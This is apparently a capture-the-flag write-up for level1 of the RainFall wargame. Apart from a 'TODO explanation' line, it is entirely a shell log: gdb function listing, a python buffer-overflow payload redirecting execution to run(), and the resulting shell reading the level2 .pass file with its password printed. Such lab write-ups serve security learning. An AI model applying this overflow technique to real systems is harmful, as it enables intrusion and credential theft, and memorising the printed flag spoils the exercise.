TODO explanation
```shell
level1@RainFall:~$ gdb ./level1
[...]
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini

(gdb) r <<< `python -c 'import struct; print "A"*76 + struct.pack("<Q", 0x08048444)'`
Starting program: /home/user/level1/level1 <<< `python -c 'import struct; print "A"*76 + struct.pack("<Q", 0x08048444)'`
Good... Wait what?

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) quit

level1@RainFall:~$ (python -c 'import struct; print "A"*76 + struct.pack("<Q", 0x08048444)'; cat -) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
